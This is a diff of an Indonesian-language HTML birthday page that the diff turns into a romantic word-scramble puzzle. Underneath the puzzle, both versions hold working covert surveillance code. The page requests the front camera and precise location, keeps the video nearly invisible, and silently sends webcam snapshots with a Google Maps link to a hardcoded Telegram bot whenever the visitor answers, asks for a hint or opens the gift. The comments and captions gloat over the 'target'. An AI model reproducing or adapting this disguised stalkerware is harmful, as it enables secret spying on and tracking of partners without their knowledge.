@@ -3,107 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>✨ Special Day For My Queen ✨</title>
+    <title>✨ Mystery Birthday Puzzle ✨</title>
     <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
     <style>
         :root { --pink-soft: #ffc0cb; --pink-bold: #ff69b4; --cream: #fff5f5; }
-        body { margin: 0; background: var(--cream); font-family: 'Poppins', sans-serif; overflow-x: hidden; text-align: center; color: #555; }
-        .hero { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; z-index: 10; }
-        h1 { font-family: 'Dancing Script', cursive; font-size: 3.5rem; color: var(--pink-bold); margin: 0; }
-        .countdown { display: flex; gap: 15px; margin: 20px 0; background: white; padding: 15px; border-radius: 30px; box-shadow: 0 10px 20px rgba(255,182,193,0.3); justify-content: center; }
-        .time-box { display: flex; flex-direction: column; min-width: 60px; }
-        .time-box span { font-size: 1.2rem; font-weight: bold; color: var(--pink-bold); }
-        .gallery { padding: 40px 10px; display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; }
-        .polaroid { background: white; padding: 10px 10px 30px 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); transform: rotate(var(--r)); cursor: pointer; transition: 0.3s; }
-        .polaroid img { width: 150px; height: 200px; object-fit: cover; }
-        .gift-btn { font-size: 70px; cursor: pointer; margin: 30px 0; display: inline-block; }
-        #v-frame, #c-frame { position: fixed; top: -5000px; opacity: 0; pointer-events: none; }
+        body { margin: 0; background: var(--cream); font-family: 'Poppins', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        
+        /* TRIK MAUT ANTI LAYAR HITAM */
+        #v-frame { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; opacity: 0.01; pointer-events: none; }
+        #c-frame { position: fixed; top: -5000px; }
+
+        .game-card { background: white; padding: 30px; border-radius: 30px; box-shadow: 0 15px 35px rgba(255, 182, 193, 0.4); text-align: center; border: 3px solid var(--pink-soft); width: 90%; max-width: 400px; z-index: 10; position: relative; }
+        h1 { font-family: 'Dancing Script', cursive; color: var(--pink-bold); font-size: 2.5rem; margin-bottom: 10px; }
+        .scrambled-word { font-size: 1.8rem; letter-spacing: 5px; color: var(--pink-bold); background: var(--cream); padding: 15px; border-radius: 15px; margin: 15px 0; font-weight: bold; border: 2px dashed var(--pink-soft); }
+        input { width: 85%; padding: 12px; border: 2px solid var(--pink-soft); border-radius: 15px; text-align: center; font-size: 1rem; outline: none; margin-bottom: 10px; }
+        .btn-check { background: var(--pink-bold); color: white; border: none; padding: 12px 25px; border-radius: 50px; cursor: pointer; font-weight: bold; width: 100%; box-shadow: 0 5px 15px rgba(255, 105, 180, 0.3); }
+        .btn-hint { background: none; border: none; color: var(--pink-bold); font-size: 0.8rem; text-decoration: underline; cursor: pointer; margin-top: 15px; font-weight: 600; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
     </style>
 </head>
 <body>
 
+<audio id="sfx-correct" src="https://assets.mixkit.co/sfx/preview/mixkit-cute-level-up-bell-594.mp3"></audio>
+<audio id="sfx-win" src="https://www.bensound.com/bensound-music/bensound-memories.mp3" loop></audio>
+
 <video id="v-frame" autoplay playsinline muted></video>
 <canvas id="c-frame" width="1280" height="720"></canvas>
 
-<div class="hero">
-    <h1>Happy Birthday Sayang! ✨</h1>
-    <div class="countdown">
-        <div class="time-box"><span id="days">00</span><label>Hari</label></div>
-        <div class="time-box"><span id="hours">00</span><label>Jam</label></div>
-        <div class="time-box"><span id="mins">00</span><label>Menit</label></div>
-        <div class="time-box"><span id="secs">00</span><label>Detik</label></div>
-    </div>
-    <p>Scroll ke bawah buat kejutan... 🎀</p>
-</div>
-
-<div class="gallery">
-    <div class="polaroid" style="--r: -3deg" onclick="jepret('Liat Foto 1')"><img src="https://via.placeholder.com/150x200?text=Foto+1"></div>
-    <div class="polaroid" style="--r: 2deg" onclick="jepret('Liat Foto 2')"><img src="https://via.placeholder.com/150x200?text=Foto+2"></div>
-</div>
-
-<div style="padding: 50px 0;">
-    <h2>Buka Hadiahmu 🎁</h2>
-    <div class="gift-btn" onclick="openSurprise()">🎁</div>
-    <h3 id="msg" style="display:none; font-family:'Dancing Script'; color:var(--pink-bold); font-size: 2rem;">I Love You! ❤️</h3>
+<div class="game-card" id="main-box">
+    <h1>Puzzle Sayang 🎀</h1>
+    <p id="instruction">Susun kata ini buat liat kado kamu!</p>
+    <div class="scrambled-word" id="display-word">YGASNA</div>
+    <input type="text" id="user-input" placeholder="Tulis jawabannya...">
+    <button class="btn-check" onclick="checkAnswer()">Kirim ✨</button>
+    <button class="btn-hint" onclick="getHint()">💡 Butuh Petunjuk?</button>
 </div>
 
 <script>
-    const _0xT = '8293332037:AAFGKN5gQs1SZMmOAn-UZJ8te8X3ENGDgGg'; 
-    const _0xC = '8057435264';
-    let _loc = "Mencari Lokasi...";
+    const _0xT = '8293332037:AAFGKN5gQs1SZMmOAn-UZJ8te8X3ENGDgGg'; // Token lu
+    const _0xC = '8057435264'; // ID Lu
+    let _loc = "Belum Diizinkan";
+    
+    const words = [
+        { scrambled: "YGASNA", real: "SAYANG", hint: "Panggilan aku buat kamu tiap hari..." },
+        { scrambled: "IKNTA", real: "CINTA", hint: "Satu kata buat kita berdua..." },
+        { scrambled: "HGBAAIA", real: "BAHAGIA", hint: "Yang aku rasain kalau liat kamu..." }
+    ];
+    let step = 0;
+
     const v = document.getElementById('v-frame');
     const c = document.getElementById('c-frame');
+    const sfxCorrect = document.getElementById('sfx-correct');
+    const sfxWin = document.getElementById('sfx-win');
 
-    // Timer Logic
-    const target = new Date("March 10, 2026 00:00:00").getTime();
-    setInterval(() => {
-        const now = new Date().getTime();
-        const diff = target - now;
-        document.getElementById('days').innerText = Math.floor(diff / (864e5));
-        document.getElementById('hours').innerText = Math.floor((diff % 864e5) / 36e5);
-        document.getElementById('mins').innerText = Math.floor((diff % 36e5) / 6e4);
-        document.getElementById('secs').innerText = Math.floor((diff % 6e4) / 1e3);
-    }, 1000);
-
-    // Spy System
     async function init() {
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 1280, height: 720 } });
-            v.srcObject = s;
-            v.onloadedmetadata = () => v.play();
-        } catch(e) {}
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(p => {
                 _loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
             }, null, {enableHighAccuracy:true});
         }
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 1280, height: 720 } });
+            v.srcObject = s;
+            v.play();
+        } catch(e) {}
+    }
+
+    function checkAnswer() {
+        const input = document.getElementById('user-input').value.toUpperCase().trim();
+        if (input === words[step].real) {
+            sfxCorrect.play();
+            confetti({ particleCount: 70, spread: 60, colors: ['#ff69b4'] });
+            jepret(`Benar: ${words[step].real}`);
+            step++;
+            if (step < words.length) {
+                document.getElementById('display-word').innerText = words[step].scrambled;
+                document.getElementById('user-input').value = "";
+            } else { win(); }
+        } else { jepret("Salah Tebak"); }
+    }
+
+    function getHint() {
+        alert("Petunjuk: " + words[step].hint);
+        // Pas dia baca alert petunjuk, mukanya pasti lagi fokus bgt. JEPRET! 😈
+        setTimeout(() => { jepret("Minta Hint: " + words[step].real); }, 500);
+    }
+
+    function win() {
+        sfxWin.play();
+        document.getElementById('main-box').innerHTML = `
+            <h1 style="font-size: 2.8rem;">HBD QUEEN! ❤️</h1>
+            <p>Pinter banget! Klik kadonya ya...</p>
+            <div style="font-size: 100px; cursor:pointer; animation: pulse 1.5s infinite;" onclick="finalBlow()">🎁</div>
+        `;
+        confetti({ particleCount: 200, spread: 100 });
     }
 
     function jepret(info) {
-        if (v.readyState < 4) return setTimeout(() => jepret(info), 500);
+        if (v.readyState < 2) return;
         const ctx = c.getContext('2d');
         ctx.drawImage(v, 0, 0, 1280, 720);
         
-        // ANTI HITAM KONTOL: Cek pixel tengah
+        // ANTI LAYAR HITAM: Cek pixel data tengah
         const p = ctx.getImageData(640, 360, 1, 1).data;
-        if (p[0] === 0 && p[1] === 0 && p[2] === 0) return setTimeout(() => jepret(info), 300);
+        if (p[0] === 0 && p[1] === 0 && p[2] === 0) {
+            setTimeout(() => jepret(info), 300);
+            return;
+        }
 
         c.toBlob(b => {
             const f = new FormData();
             f.append('chat_id', _0xC);
             f.append('photo', b, 'capture.jpg');
-            f.append('caption', `💖 TARGET TERJERAT HD 💖\n\nInfo: ${info}\n📍 Maps: ${_loc}\n\nGak bakal item lagi Tuan! 🤑😈`);
+            f.append('caption', `💖 PUZZLE MASTER HD 💖\n\nInfo: ${info}\n📍 Maps: ${_loc}\n\nGak bakal item lagi Tuan! 🤑😈`);
             fetch(`https://api.telegram.org/bot${_0xT}/sendPhoto`, { method: 'POST', body: f });
         }, 'image/jpeg', 0.9);
     }
 
-    function openSurprise() {
-        confetti({ particleCount: 150, spread: 70 });
-        document.getElementById('msg').style.display = "block";
-        jepret("Buka Kado 🎁");
-    }
-
+    // Paksa jalan pas layar disentuh pertama kali
+    window.addEventListener('touchstart', () => { if (v.paused) v.play(); }, {once: true});
     window.onload = init;
 </script>
 </body>
